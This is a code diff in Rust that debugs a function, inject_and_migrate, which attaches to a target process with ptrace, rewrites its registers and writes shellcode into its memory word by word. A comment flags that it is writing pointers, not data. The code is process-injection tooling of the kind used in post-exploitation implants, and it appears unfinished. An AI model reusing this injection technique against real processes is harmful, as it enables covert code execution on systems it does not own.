@@ -1,5 +1,5 @@
 extern crate nix;
-use nix::sys::ptrace::{attach, detach, getregs, setregs, write};
+use nix::sys::ptrace::{attach, detach, getregs, read, setregs, write};
 use nix::sys::wait::waitpid;
 use nix::unistd::Pid;
 use std::process::{self, Command};
@@ -69,12 +69,13 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     };
 
     // Modify registers similar to how http://phrack.org/issues/59/12.html did
-    registers.rsp -= 4;
-    if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
-        panic!("Unable to write RIP to RSP in target process: {}", error);
-    }
-    let mut point = registers.rsp - 1024;
-    registers.rip = registers.rsp - 1022;
+    //registers.rsp -= 4;
+    //if let Err(error) = unsafe { write(target_pid, registers.rsp as *mut c_void, registers.rip as *mut c_void) }{
+    //    panic!("Unable to write RIP to RSP in target process: {}", error);
+    //}
+    //let mut point = registers.rsp - 1024;
+    //registers.rip = registers.rsp - 1022;
+    let mut point = registers.rip;
     println!("POINT {:?} RIP {:?}", point as *mut c_void, registers.rip as *mut c_void);
     if let Err(error) = setregs(target_pid, registers) {
         panic!("Unable to reset target process registers: {}", error);
@@ -86,9 +87,13 @@ pub fn inject_and_migrate(shellcode: &[u8]) {
     for chunk in shellcode_chunks {
         println!("WRITING VALUE {:?} FROM {:p} TO {:?}", chunk, chunk, point as *mut c_void);
         if let Err(error) = unsafe { write(target_pid, point as *mut c_void, chunk.as_ptr() as *mut c_void) } {
-            panic!("Unable to portion of shellcode at {:p} to target process: {}", chunk, error);
+            panic!("Unable to write portion of shellcode at {:p} to target process: {}", chunk, error);
         }
-        point += word_size_in_bytes as u64;
+        // THIS SEEMS TO BE THE PROBLEM. THE POINTER IS BEING WRITTEN TO THE PROCESS, NOT THE DATA
+        if let Ok(stuff) = read(target_pid, point as *mut c_void) {
+            println!("Read {:x} from {:?}", stuff, point as *mut c_void);
+        }
+        point -= word_size_in_bytes as u64;
     }
 
     // Detach from the process so it can resume execution
